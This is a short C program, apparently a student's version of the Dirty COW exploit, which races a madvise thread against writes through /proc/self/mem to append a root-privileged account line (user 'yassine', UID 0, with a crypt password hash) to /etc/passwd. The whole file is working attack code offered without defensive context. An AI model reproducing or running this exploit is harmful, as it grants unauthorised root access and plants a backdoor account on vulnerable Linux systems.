#include <fcntl.h>///files control
#include <pthread.h>///work with threads
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>///mapping files to memory
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>///to stop a process for a period of time 
#include <sys/ptrace.h>///to keep tracking on processes
#include <stdlib.h>
#include <unistd.h>
#include <crypt.h>///for some cryptographie

char * user="yassine:2GOP21lLHdCZI:0:0:root:/root:/usr/bin/zsh";
void * map;///point to a block of memory
char * filename="/etc/passwd";
int f;
struct stat  st;
/// the code  is yassine added to the salt 2GI2023 the crypt fonc use md5 encryption with salt 
void * madivseThread(void * arg){
int i=0;
for(i=0;i<1000000;i++){
madvise(map,100,MADV_DONTNEED);
printf("%d call t madvise \n",i);
}
//printf("%d call t madvise ",i);
}


void * cowThread(void * arg){
int f =open("/proc/self/mem",O_RDWR);
while(1){
printf("try to write %s in %p \n",user,map);
lseek(f,(uintptr_t)map+st.st_size-1,SEEK_SET);
write(f,user,strlen(user));
}
}

int main(){
pthread_t pth1,pth2;
///printf("%s",crypt("yassine","2GI2023"));
///OPEN THE FILE AND GET STATE
f=open(filename,O_RDONLY);
fstat(f,&st);

////mapping the file to memory
map =mmap(NULL,st.st_size + sizeof(long ),PROT_READ,MAP_PRIVATE,f,0);
lseek(f,(uintptr_t) map + 5*sizeof(long),SEEK_SET);
pthread_create(&pth1,NULL,madivseThread,NULL);
pthread_create(&pth2,NULL,cowThread,NULL);

pthread_join(pth1,NULL);
pthread_join(pth2,NULL);
return 0;
}
